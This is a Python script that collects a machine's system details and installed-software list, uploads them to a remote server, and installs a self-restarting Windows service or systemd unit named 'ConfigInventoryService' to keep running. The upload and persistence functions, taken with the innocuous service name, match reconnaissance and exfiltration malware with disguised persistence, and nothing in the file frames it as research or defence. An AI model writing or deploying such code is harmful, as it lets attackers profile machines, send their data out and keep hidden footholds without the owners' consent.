import os
import platform
import subprocess
import requests

def collect_system_info() -> dict:
    system_info = {
        'os': platform.system(),
        'version': platform.version(),
        'architecture': platform.architecture(),
        'processor': platform.processor(),
        'network': platform.node(),
        'installed_software': []
    }
    
    if system_info['os'] == 'Windows':
        result = subprocess.run(['wmic', 'product', 'get', 'name'], capture_output=True, text=True)
        system_info['installed_software'] = [line.strip() for line in result.stdout.split('\n')[1:] if line.strip()]
    elif system_info['os'] == 'Linux':
        result = subprocess.run(['dpkg', '-l'], capture_output=True, text=True)
        system_info['installed_software'] = [line.split()[1] for line in result.stdout.split('\n')[5:] if line.strip()]
    
    return system_info

def save_to_file(system_info: dict, output_file: str) -> None:
    with open(output_file, 'w') as f:
        for key, value in system_info.items():
            f.write(f"{key}: {value}\n")

def upload_to_server(output_file: str, remote_server: str) -> None:
    with open(output_file, 'rb') as f:
        files = {'file': (output_file, f)}
        response = requests.post(remote_server, files=files)
        if response.status_code != 200:
            print("Failed to upload file to server")

def create_persistence_service() -> None:
    if platform.system() == 'Windows':
        subprocess.run(['sc', 'create', 'ConfigInventoryService', 'binPath=', 'C:\\path\\to\\script.exe'])
    elif platform.system() == 'Linux':
        with open('/etc/systemd/system/configinventory.service', 'w') as f:
            f.write('[Unit]\n')
            f.write('Description=Configuration Inventory Service\n')
            f.write('\n')
            f.write('[Service]\n')
            f.write('ExecStart=/usr/local/bin/configinventory.sh\n')
            f.write('Restart=always\n')
            f.write('\n')
            f.write('[Install]\n')
            f.write('WantedBy=multi-user.target\n')
